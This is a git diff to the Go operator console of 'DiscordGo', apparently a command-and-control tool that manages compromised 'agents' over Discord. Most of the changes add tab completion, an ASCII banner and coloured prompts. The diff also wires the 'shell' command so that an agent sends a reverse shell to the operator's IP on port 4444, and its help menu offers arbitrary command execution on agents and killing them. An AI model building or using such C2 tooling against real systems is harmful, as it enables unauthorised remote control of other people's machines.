@@ -1,12 +1,16 @@
+// +build linux
+
 package cli
 
 import (
-	"DiscordGo/pkg/agents"
-	"DiscordGo/pkg/message"
 	"fmt"
 	"io"
 	"os"
 	"strings"
+
+	"DiscordGo/pkg/agents"
+	"DiscordGo/pkg/message"
+	"DiscordGo/pkg/util"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/chzyer/readline"
@@ -25,7 +29,57 @@ func filterInput(r rune) (rune, bool) {
 	return r, true
 }
 
-//TODO: Ascii art
+var completer = readline.NewPrefixCompleter()
+
+func MainCompleter() {
+	var items []readline.PrefixCompleterInterface
+
+	for _, agent := range agents.Agents {
+		items = append(items, readline.PcItem(agent.Agent.UUID))
+	}
+
+	completer = readline.NewPrefixCompleter(
+		readline.PcItem("help"),
+		readline.PcItem("exit"),
+		readline.PcItem("agents"),
+		readline.PcItem("interact",
+			items...),
+	)
+
+	Prompt.Config.AutoComplete = completer
+
+}
+
+func AgentCompleter() {
+	var items []readline.PrefixCompleterInterface
+
+	for _, agent := range agents.Agents {
+		items = append(items, readline.PcItem(agent.Agent.UUID))
+	}
+
+	completer = readline.NewPrefixCompleter(
+		readline.PcItem("help"),
+		readline.PcItem("exit"),
+		readline.PcItem("agents"),
+		readline.PcItem("interact",
+			items...),
+	)
+
+	Prompt.Config.AutoComplete = completer
+
+}
+
+// ASCIIArt is HEREEEEEE
+var ASCIIArt = `
+
+@@@@@@@  @@@  @@@@@@  @@@@@@@  @@@@@@  @@@@@@@  @@@@@@@        @@@@@@@  @@@@@@ 
+@@!  @@@ @@! !@@     !@@      @@!  @@@ @@!  @@@ @@!  @@@      !@@      @@   @@@
+@!@  !@! !!@  !@@!!  !@!      @!@  !@! @!@!!@!  @!@  !@!      !@!        .!!@! 
+!!:  !!! !!:     !:! :!!      !!:  !!! !!: :!!  !!:  !!!      :!!       !!:    
+:: :  :  :   ::.: :   :: :: :  : :. :   :   : : :: :  :        :: :: : :.:: :::
+																	   
+`
+
 // Shell is start of the command line mode
 func Shell(dg *discordgo.Session) {
 	promtpState := "main"
@@ -35,18 +89,19 @@ func Shell(dg *discordgo.Session) {
 	// because golang just sucks
 	// Also with these, I get history file
 	readlinePrompt, err := readline.NewEx(&readline.Config{
-		Prompt:      "\033[31mDiscordGo>>> \033[0m",
-		HistoryFile: "/tmp/readline.tmp",
-		// AutoComplete:    completer,
+		Prompt:          "\033[31mDiscordGo>>> \033[0m",
+		HistoryFile:     "/tmp/readline.tmp",
+		AutoComplete:    completer,
 		InterruptPrompt: "^C",
 		EOFPrompt:       "exit",
 
-		HistorySearchFold: true,
+		HistorySearchFold:   true,
 		FuncFilterInputRune: filterInput,
 	})
 
 	// Doing this so I can change the prompt later on
 	Prompt = readlinePrompt
+	MainCompleter()
 
 	if err != nil {
 		panic(err)
@@ -82,7 +137,7 @@ func Shell(dg *discordgo.Session) {
 						if agents.DoesAgentExist(cmd[1]) {
 							focusedAgent = cmd[1]
 							// TODO: Fix color scheme
-							Prompt.SetPrompt("DiscordGo[" + cmd[1] + "]>> ")// TODO: Need to shorten the UUID
+							Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + cmd[1] + "\033[31m]>> \033[0m")
 							promtpState = "agent"
 						} else {
 							fmt.Println("Agent: " + cmd[1] + " does not exist")
@@ -100,7 +155,6 @@ func Shell(dg *discordgo.Session) {
 					fmt.Println("Exiting....")
 					os.Exit(0)
 				case "help":
-					fmt.Println("Help menu")
 					agentMenuHelp()
 				case "back":
 					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
@@ -111,7 +165,7 @@ func Shell(dg *discordgo.Session) {
 						fmt.Println(cmd[1:])
 						fmt.Println("Target: " + focusedAgent)
 						finalCmd := ""
-						for _, precmd := range cmd{
+						for _, precmd := range cmd {
 							finalCmd += precmd + " "
 						}
 						finalCmd = strings.TrimSpace(finalCmd)
@@ -121,11 +175,13 @@ func Shell(dg *discordgo.Session) {
 					}
 				case "shell":
 					fmt.Println("sending a shell to you on port 4444")
+					message.SendShell(dg, focusedAgent, util.GetLocalIP())
 				case "ping":
 					message.Ping(dg, focusedAgent, true)
 				case "kill":
-					//
 					message.KillAgent(dg, focusedAgent)
+					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
+					promtpState = "main"
 				case "agents":
 					listAgents()
 				}
@@ -155,8 +211,8 @@ func agentMenuHelp() {
 		{"help", "Display this menu"},
 		{"exit", "Exiting the server"},
 		{"kill", "stop/remove the agent"},
-		{"command", "send command to the agent"},
-		{"shell", "send a reverse shell to us"},
+		{"command", "send command to the agent"}, 
+		{"shell", "send a reverse shell to us"}, // Optional to give their port #
 		{"ping", "check if the agent is alive"},
 		{"back", "Return back to main menu"},
 		{"agents", "List all the connected agents"},
